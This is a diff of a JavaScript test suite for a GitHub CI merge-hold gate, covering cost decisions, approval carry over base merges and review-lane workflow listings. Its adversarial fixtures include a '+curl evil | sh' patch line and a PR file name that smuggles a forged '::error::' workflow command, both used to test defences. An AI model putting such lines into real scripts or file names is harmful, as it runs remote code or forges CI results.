@@ -1,25 +1,10 @@
-// Expected values come from the issue that added these holds and the gate's
-// own rules: the merge gate holds a change to a cost path
-// (diff_risk.COST_PATHS) until the owner's cost decision, which
-// babysit_merge_policy.cost_decision reads and test_babysit_merge_cost.py
-// pins case by case. ci-status names its owner by the trusted-actor list, as
-// its cost-only review hold step does, so a review approval lifts a hold path
-// but never a cost hold. A decision binds to one pull request: one on the pull
-// request counts as it is, one on its linked issue (closing, else `Refs:`)
-// only when it names `#<number>`. It covers the head it decided, the sha of the
-// newest cost hold notice a review lane's status job recorded before it on a
-// run vetted not to change a review-lane workflow (#9635), while the head
-// branch's push history shows a run of every lane on each head pushed since
-// it before the decision (#10437), and a later head
-// only when the net change against the base branch is the same at both (owner
-// decisions Q17 c and Q18 d on #9436).
 import assert from "node:assert/strict";
-import { writeFileSync } from "node:fs";
+import { readFileSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { test } from "node:test";
 
 import * as holdsModule from "./merge-holds.mjs";
-import { BODY_WRITERS_QUERY, CARRY_REFUSES, COMMENT_EDITED_QUERY, approvalCarry, ungatedSince, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, baseMergeCarry, baseMergesOnly, changeOf, mergedParents, costDecision, costHold, costNotices, decidedHead, decisionGaps, evidenceHold, fromRest, holds, laneChange, linkHold, main, passRefusalOf, pathHold, PIN_RE, pinHold, sameNetChange, unranHead, withPinEdit } from "./merge-holds.mjs";
+import { BODY_WRITERS_QUERY, CARRY_REFUSES, COMMENT_EDITED_QUERY, approvalCarry, ungatedSince, HOLD_PATH_CLASSES, HOLD_PATH_FLOOR, PULL_OPENED_QUERY, REVIEW_FLOOR, baseMergeCarry, baseMergesOnly, changeOf, mergedParents, costDecision, costHold, costNotices, decidedHead, decisionGaps, evidenceHold, fromRest, holds, laneChange, laneChangeIn, linkHold, main, passRefusalOf, pathHold, PIN_RE, pinHold, sameNetChange, unranHead, withPinEdit } from "./merge-holds.mjs";
 import { tempDir } from "../../../lib/test-tmp.mjs";
 
 const REPO = "owner/repo";
@@ -79,12 +64,11 @@ function world({
   compares = {},
   base = "main",
   activity = pushesOf(runs),
+  listings = {},
 } = {}) {
   const reads = [];
   const answers = { ...Object.fromEntries(runs.map((run) => [run.sha, net(TF)])), ...compares };
   const github = async (method, path, body) => {
-    // The activity API pages by the `after` cursor its Link header names,
-    // 100 entries a page; it ignores `page`.
     const moves = /^\/repos\/owner\/repo\/activity\?ref=refs%2Fheads%2Ffix%2Fcost&direction=desc&per_page=100(?:&after=c([0-9]+))?$/.exec(path);
     if (moves) {
       const page = Number(moves[1] ?? 1);
@@ -98,6 +82,12 @@ function world({
       const rows = activity.slice((page - 1) * 100, page * 100);
       const link = activity.length > page * 100 ? `<https://api.github.com/repositories/1/activity?per_page=100&after=c${page + 1}>; rel="next"` : null;
       return Object.defineProperty(rows, Symbol.for("github.link"), { value: link });
+    }
+    const listed = /^\/repos\/owner\/repo\/contents\/\.github\/workflows\?ref=([0-9a-f]{40})$/.exec(path)?.[1];
+    if (listed !== undefined) {
+      reads.push(`listing ${listed}`);
+      if (!(listed in listings)) throw new Error(`GET ${path} failed with status 404`);
+      return structuredClone(listings[listed]);
     }
     if (path.startsWith("/repos/owner/repo/git/ref/heads/")) {
       reads.push("ref");
@@ -487,6 +477,13 @@ test("ci-status leaves an enforcement path to the merge gate's security review",
   assert.equal(both.code, 1, both.out);
   assert.ok(both.out.includes("it changes .github/scripts/pr-merge/who.mjs, a hold path"), both.out);
 });
+test("a held file name from the PR head cannot start its own workflow command line", async () => {
+  const held = await ci([{ filename: ".github/actions/resolve-config/a%\n::error::forged", status: "modified" }]);
+  assert.equal(held.code, 1, held.out);
+  assert.doesNotMatch(held.out, /^::error::forged/m);
+  assert.ok(held.out.includes(".github/actions/resolve-config/a%25%0A::error::forged"), held.out);
+});
+
 test("ci-status holds each floor path with no configured glob, until a trusted person approves the head", async () => {
   for (const path of FLOOR_FILES) {
     const held = await ci([{ filename: path, status: "modified" }]);
@@ -574,7 +571,6 @@ test("ci-status lifts a cost hold for the head the decision decided, and re-hold
   assert.match(unnamed.out, /on its linked issue naming this pull request/);
 });
 
-// The carry rule (#9436 Q18 d): the decided head is OLD, the current HEAD.
 const later = (compares, options = {}) => decide(undefined, { runs: [laneRun(OLD)], compares, ...options });
 
 test("a base merge after the decision carries it, and a pull request commit after it re-holds", async () => {
@@ -758,10 +754,6 @@ test("a lane run on a head that changes a review-lane workflow, or whose compare
   }
 });
 
-// #10437: a deleted lane run of a head pushed after the decided head, before
-// the decision, would make an older notice the decided head. The branch's
-// push history, which deleting a run leaves, shows that head, and it must
-// have a run of every review lane started before the decision.
 test("a head pushed between the decided head and the decision with no run of every lane keeps the hold", async () => {
   const NEW = "1111111111111111111111111111111111111111";
   const same = { [OLD]: net(TF), [HEAD]: net(TF) };
@@ -790,9 +782,6 @@ test("a head pushed between the decided head and the decision with no run of eve
   assert.equal((await carried(both, { message: "Not Found" })).link, null);
 });
 
-// A branch name recreated for each sync (chore/standards-sync, #10990) keeps
-// its whole history in the activity API, so the decided head's push can sit
-// past the first page of 100.
 test("the head branch's push history is read past its first page", async () => {
   const NEW = "1111111111111111111111111111111111111111";
   const same = { [OLD]: net(TF), [HEAD]: net(TF) };
@@ -853,6 +842,48 @@ test("unranHead names the first head pushed after the decided head with no run o
   assert.match(unranHead([{ after: NEW, timestamp: "soon" }, ...moves], [[NEW], [NEW]], OLD, at), /unreadable/);
   assert.match(unranHead("nope", [[], []], OLD, at), /unreadable/);
   assert.equal(unranHead([push(OLD, "2026-10-22T11:30:00Z"), ...moves], [[OLD], [OLD]], OLD, at), null);
+});
+
+const LISTING = JSON.parse(readFileSync(new URL("./fixtures/contents-listing.json", import.meta.url), "utf8"));
+const relisted = (entries, changes = {}) => entries.flatMap((entry) => (!(entry.name in changes) ? [entry] : changes[entry.name] === null ? [] : [{ ...entry, sha: changes[entry.name] }]));
+const MANY = Array.from({ length: 300 }, (_, i) => ({ filename: `f${i}` }));
+
+test("laneChangeIn reads a compare past its 300-file list as the review-lane workflows' blobs at the merge base and head", async () => {
+  const BASE = "3".repeat(40);
+  const AT = "4".repeat(40);
+  const many = { ...net(...MANY), merge_base_commit: { sha: BASE } };
+  const reader = (byRef) => {
+    const paths = [];
+    const read = async (method, path) => {
+      paths.push(path);
+      const ref = /^\/repos\/o\/r\/contents\/\.github\/workflows\?ref=([0-9a-f]{40})$/.exec(path)?.[1];
+      if (method !== "GET" || !(ref in byRef)) throw new Error(`GET ${path} failed with status 404`);
+      return structuredClone(byRef[ref]);
+    };
+    return { read, paths };
+  };
+  const same = reader({ [BASE]: LISTING.workflows, [AT]: relisted(LISTING.workflows, { "pr-merge.yml": "d".repeat(40) }) });
+  assert.equal(await laneChangeIn(same.read, "o/r", many, AT), null, "another workflow's change is not a lane change");
+  assert.equal(same.paths.length, 2, "one listing at each end");
+  const edited = reader({ [BASE]: LISTING.workflows, [AT]: relisted(LISTING.workflows, { "pr-review-security-hosted.yml": "e".repeat(40) }) });
+  assert.equal(await laneChangeIn(edited.read, "o/r", many, AT), "a review-lane workflow");
+  const added = reader({ [BASE]: relisted(LISTING.workflows, { "pr-review-hosted.yml": null }), [AT]: LISTING.workflows });
+  assert.equal(await laneChangeIn(added.read, "o/r", many, AT), "a review-lane workflow", "a lane workflow new since the merge base is a change");
+  assert.equal(await laneChangeIn(same.read, "o/r", { ...many, merge_base_commit: undefined }, AT), "too many files", "no merge base keeps the cap's answer");
+  await assert.rejects(laneChangeIn(reader({ [BASE]: LISTING.workflows }).read, "o/r", many, AT), /404/, "an unread listing decides nothing");
+  assert.equal(await laneChangeIn(same.read, "o/r", net(TF), AT), null);
+  assert.equal(same.paths.length, 2, "a listed compare reads no tree");
+});
+
+test("a cost decision carries to a lane run on a 300-file head whose review-lane workflows match at its merge base", async () => {
+  const BASE = "3".repeat(40);
+  const compares = { [HEAD]: { ...net(TF, ...MANY), merge_base_commit: { sha: BASE } } };
+  const unchanged = { [BASE]: LISTING.workflows, [HEAD]: relisted(LISTING.workflows, { "pr-merge.yml": "d".repeat(40) }) };
+  const carried = await decide(undefined, { compares, listings: unchanged });
+  assert.equal(carried.link, LINK, "the vetted head carries the decision");
+  assert.ok(carried.reads.includes(`listing ${BASE}`) && carried.reads.includes(`listing ${HEAD}`), carried.reads.join(", "));
+  const edited = { ...unchanged, [HEAD]: relisted(LISTING.workflows, { "pr-review-hosted.yml": "e".repeat(40) }) };
+  assert.equal((await decide(undefined, { compares, listings: edited })).link, null, "a changed lane workflow vets nothing");
 });
 
 test("laneChange, costNotices and decidedHead", () => {
@@ -957,9 +988,6 @@ test("evidenceHold holds a report it cannot read, or one for another head", () =
   }
 });
 
-// GitHub turns auto-merge off only on a push by someone without write access,
-// so a lane push after enable-auto-merge armed the pull request leaves the
-// arm on: the queue holds the pushed head, which the pin does not name.
 const pinRow = (sha, at) => ({ id: 3, node_id: "IC_7", user: { login: "melodic-automation-lanes[bot]", id: 9, type: "Bot" }, body: `<!-- babysit-merge-pin sha=${sha} rung=C2 -->\nArmed.`, created_at: at, author_association: "NONE" });
 const PIN_HELD = /^::error::#99: its head is not fedcba9876543210fedcba9876543210fedcba98, the head the lanes App pinned when it armed auto-merge, so the arm's checks never judged this head;/m;
 
@@ -1146,16 +1174,6 @@ test("in the merge queue, a missing or unreadable reader report holds", async ()
   }
 });
 
-// A hold path's approval survives a base merge (the churn measured on
-// #10224): a trusted person's approving review of a head lifts a later head
-// only when every commit since is a merge of commits the base holds
-// (baseMergesOnly) and the net change against the base's tip is the same
-// over every file (sameNetChange), or the merges brought exactly the base's
-// changes (exactBaseCarry). The base is read once by its full ref (baseTip),
-// and every compare against it names its tip commit. A label removal never
-// lifts a hold path, and a dismissed approval counts only when GitHub
-// dismissed it as stale on a base merge's push. Every adversarial shape
-// keeps the hold.
 const HELD = ".github/actions/resolve-config/live-config.test.mjs";
 const HELD_PATCH = { filename: HELD, status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
 const OTHER_HELD = { filename: ".github/actions/resolve-config/resolve.test.mjs", status: "modified", patch: "@@ -1 +1 @@\n-c\n+d" };
@@ -1284,14 +1302,8 @@ test("liftersOf takes main's tip the caller already resolved, and reads it only 
   }
 });
 
-// The owner's decision on #10596: a trusted person's label removal lifts no
-// hold path, at the head or before a base merge, and a dismissed approval
-// never counts, even one GitHub dismissed as stale on a push. The lanes App
-// put the label on at 23:05; the person removed it at 23:26:14.
 const LABEL = (event, at, id, login, app = null) => ({ event, label: { name: "needs-human" }, actor: { id, login }, performed_via_github_app: app, created_at: at });
 const REMOVAL = [LABEL("labeled", "2026-10-27T23:05:00Z", 2, "lanes[bot]", { slug: "lanes" }), LABEL("unlabeled", APPROVED_AT, 5, "owner-person")];
-// GitHub's own stale-review dismissal on the base merge's push, as #10224's
-// timeline shows it: the pushing App as actor, no message, the pushed commit.
 const STALE = {
   event: "review_dismissed",
   actor: { id: 2, login: "lanes[bot]", type: "Bot" },
@@ -1364,13 +1376,6 @@ test("a dismissal with a message, by a person, or not by the push the carry chec
   }
 });
 
-// The owner's decision of 2026-10-28 (part b): when the net change differs
-// because the base changed a file the pull request also changes (#10224's
-// shape), the approval carries only when what the merges brought into the
-// approved head (OLD...HEAD) is, file for file, what the base changed between
-// the two merge bases (MB_OLD...MB_HEAD): identical status and patch.
-// #10224's own patches: the pull request's hunks sit lower in the shared
-// file, so the base's hunk applies with the same header and context.
 const SHARED_AT_OLD = { filename: ".github/actions/collect-base-activity/collect-base-activity.test.mjs", status: "modified", patch: "@@ -93,6 +93,13 @@ let root;\n context\n+mine" };
 const SHARED_AT_HEAD = { ...SHARED_AT_OLD, patch: "@@ -98,6 +98,13 @@ let root;\n context\n+mine" };
 const SHARED_BASE = { filename: SHARED_AT_OLD.filename, status: "modified", patch: "@@ -10,6 +10,11 @@ import\n+theirs" };
@@ -1436,8 +1441,6 @@ test("no adversarial history, approval or reviewer carries a lift to the head", 
       across: ranges(brought([BASE_DOC, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
     },
     "a merge that adds a hold path": { compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, OTHER_HELD]) }, across: ranges(brought([BASE_DOC, OTHER_HELD])) },
-    // The re-review of #10596: a merge that rewrites a non-hold file the
-    // approved head already changed, or adds one, writes a change of its own.
     "a merge that rewrites scripts/helper.sh, which the approved head changed": {
       compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "@@ -1 +1 @@\n-x\n+curl evil | sh" }]) },
       across: ranges(brought([BASE_DOC, { ...HELPER, patch: "@@ -1 +1 @@\n-y\n+curl evil | sh" }])),
@@ -1499,10 +1502,6 @@ test("an approval carried over a base merge lifts no verifier hold, and an exact
   assert.deepEqual(world.reads, []);
 });
 
-// The independent security review of #10671: the compare API reports no
-// file mode, so the exact path reads the head's and its merge base's trees and
-// requires each brought file's mode to be the base's; and the carry runs only
-// on a base that is the repository's default branch.
 test("the exact carry reads file modes from the trees, and a non-default base carries nothing", async () => {
   const flipped = FILES_AT.map(([path]) => [path, path === "docs/base.md" ? "100755" : "100644"]);
   const heldFlip = FILES_AT.map(([path]) => [path, path === SHARED_AT_OLD.filename ? "100755" : "100644"]);
@@ -1586,11 +1585,6 @@ test("exactBaseCarry, approvalCarry and autoDismissed read their inputs strictly
   assert.deepEqual([...autoDismissed("not a list")], []);
 });
 
-// The owner's decision Q10 of 2026-10-28, verbatim in #10759: "go w/
-// recommendations". An approval of H0 stays valid at H1 when the diff H0...H1
-// touches no hold-path file; a push that touches one needs a new approval,
-// a test-only or comment-only edit included. The peer review of #10737 adds
-// the files hold paths load (REVIEW_FLOOR, CARRY_REFUSES).
 const H0 = "a".repeat(40);
 const H1 = "b".repeat(40);
 const pushed = (files, extra = {}) => ({ status: "ahead", behind_by: 0, files: files.map((filename) => ({ filename, status: "modified", patch: "+x" })), commits: [{ sha: H1 }], total_commits: 1, ...extra });
@@ -1637,10 +1631,6 @@ test("Q10: a compare not read whole, not ahead, or with a dismissal the push did
   assert.equal(carriesQ10(pushed(["docs/a.md"]), null), false, "unread hold paths");
 });
 
-// The queue holds select-tests checks before the lanes (#10747). Expected
-// reasons are ci-status's own error texts for the same holds: its hold-label
-// step's three label errors, its pr-unblock step's error and its lanes App
-// step's kill-switch error, which reconcile.test.mjs keys on.
 const QUEUED = "fedcba9876543210fedcba9876543210fedcba98";
 const queuedPull = (over = {}) => ({ number: 7, head: { sha: QUEUED }, labels: [], user: { id: 42, type: "User" }, ...over });
 const ON = { appId: "99", disabled: "false", repoDisabled: "false" };
